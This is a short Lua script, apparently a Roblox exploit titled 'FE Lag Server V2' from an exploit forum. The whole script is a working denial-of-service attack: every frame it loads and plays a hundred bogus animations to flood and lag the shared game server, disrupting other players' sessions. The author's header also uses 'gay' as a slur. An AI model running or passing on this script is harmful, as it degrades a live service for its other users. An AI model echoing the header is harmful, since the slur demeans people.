--[[
    FE Lag Server V2 | Script made by Cyclically | Credits to tostringfunction for being a gay ass function also credit to Corewave for the whole idea 
    https://v3rmillion.net/member.php?action=profile&uid=785986

    get ur task manager and fire extinguisher ready incase ur pc gets on fire
]]

local lag_strength = 100

-- Don't edit script below unless you know what you're doing. If you wanna add this into a script, please give credits and message me on discord that you added it in a script at Cyclically#4905

local LocalPlayer = game:GetService("Players").LocalPlayer
while game:GetService("RunService").RenderStepped:Wait() do
    for i = 1, lag_strength do
        local anim = Instance.new("Animation")
        anim.AnimationId = "CYCLICALLY IS THE BEST\n"..math.random()
        LocalPlayer.Character.Humanoid:LoadAnimation(anim):Play()
        anim:Destroy()
    end
end